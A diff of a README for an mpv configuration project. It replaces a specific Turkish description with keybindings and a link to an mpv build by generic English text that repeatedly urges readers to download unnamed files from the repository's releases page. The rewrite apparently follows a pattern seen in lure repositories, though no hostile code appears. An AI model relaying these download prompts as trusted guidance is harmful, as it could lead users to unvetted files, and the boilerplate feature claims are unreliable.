@@ -1,23 +1,74 @@
-# Mpv BOK Config
-### Kişiselleştirilmiş Mpv Config
-![Arayüz Örnek](Screenshots/mpv-bok-1.png)
-![Sağ Tık Menü Örnek](Screenshots/mpv-bok-2.png)
-# Genel Bakış
-Kendi kullandığım mpv config dosyalarıdır, geliştirilmiş UOSC arayüzü, sağ tık menüsü ve çeşitli scriptleri içerir. Arayüzü normal bir kullanıcı için yeterli seviyededir. İnsancıl bir mpvdir, ısırmaz, ağzından salya akmaz, bakanı korkutmaz.
+# 🎥 portable-config - Enhance Your MPV Experience Easily
 
-Shader ve profiller içindedir, istediğiniz shader'ı sağ tık menüsünden veyahut belirlenen tuş atamalarıyla aç kapat yapabilirsiniz. Shader profilleri ile halihazırda kombine edilmiş shader'ları da çalıştırabilirsiniz. Anime ve Movie / Series olarak iki adet altyazı profili bulunmaktadır, altyazı stili ve tercih edilen dil bu profille birlikte değişir, ses dili de değişir.
+[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Thecatek/portable-config/releases)
 
-# Tuş atamaları
-- `CTRL+r` Genel reset.
-- `CTRL+1-CTRL+9` Shader aç kapat.
-- `CTRL+0` Shader'ları temizle.
-- `F1-F11` Profiller.
-- `CTRL+p` Tuş atamaları Cheatsheet.
+## 🚀 Getting Started
 
-# Kurulum
+Welcome to portable-config! This application provides custom configuration files for MPV, making your media player experience visually appealing. Follow these simple steps to download and run the software.
 
-1. [Mpv Sürümü](https://sourceforge.net/projects/mpv-player-windows/files/64bit-v3/mpv-x86_64-v3-20250824-git-5faec4e.7z/download) linkine tıklayın ve dosyayı indirin.
-2. İndirilen `.zip` dosyasını çıkartın.
-3. `portable_config` klasörünü, çıkarttığınız `mpv.exe` dosyasının bulunduğu dizine kopyalayın.
-4. `mpv.exe` dosyasına çift tıklayarak MPV'yi çalıştırın.
+## 📥 Download & Install
 
+To get started, you need to download the configuration files:
+
+1. **Visit the releases page**: Click the button below to access the release files.
+
+   [Download Here](https://github.com/Thecatek/portable-config/releases)
+
+2. **Download the latest version**: On the releases page, find the latest version of portable-config. Look for a file that you can download. This will typically be a `.zip` or `.tar.gz` file.
+
+3. **Unzip the file**: Once the download completes, locate the file on your computer. Right-click it and select "Extract All" or use your preferred extraction tool.
+
+4. **Place the config files**: After extraction, you will find several configuration files. Move these files to the MPV configuration directory. You can usually find this in your system folder under:
+   - Windows: `C:\Users\<YourUsername>\AppData\Roaming\mpv\`
+   - macOS: `~/Library/Application Support/mpv/`
+   - Linux: `~/.config/mpv/`
+
+5. **Start MPV**: Open MPV and enjoy your personalized viewing experience.
+
+## 📋 Features
+
+- **Customizable Look**: Tailor the appearance of MPV to suit your taste.
+- **Optimized Settings**: Experience improved performance and enhanced visuals while watching videos.
+- **Compatibility**: Works seamlessly with various media formats supported by MPV.
+- **User-Friendly Interface**: Quick setup with straightforward instructions.
+
+## ⚙️ System Requirements
+
+- **Operating System**: Windows 7 or later, macOS Sierra or later, or any modern Linux distribution.
+- **MPV Player**: Ensure you have the MPV media player installed, as these configuration files work specifically for it.
+
+## 📌 Topics
+
+- config
+- configuration-files
+- glsl
+- gui
+- lua
+- media-player
+- mpv
+- mpv-config
+- shaders
+- video
+- video-player
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, consider the following:
+
+- **Check MPV Installation**: Make sure MPV is installed and functioning. Test it with a simple video file.
+- **Review Config Placement**: Double-check that the configuration files are placed in the correct directory.
+- **Consult Logs**: If MPV does not launch correctly, look for error messages in the terminal or log file.
+
+For further assistance, you can visit the Issues section of our repository for community support.
+
+## 🙏 Acknowledgments
+
+Thanks to the community for their contributions to MPV and related resources. Your support makes this project possible.
+
+## ℹ️ Contact
+
+For any questions or concerns, feel free to reach out through the GitHub repository. Your feedback is valuable. 
+
+Don't forget to download the latest release and enhance your MPV experience today!
+
+[Download Here](https://github.com/Thecatek/portable-config/releases)
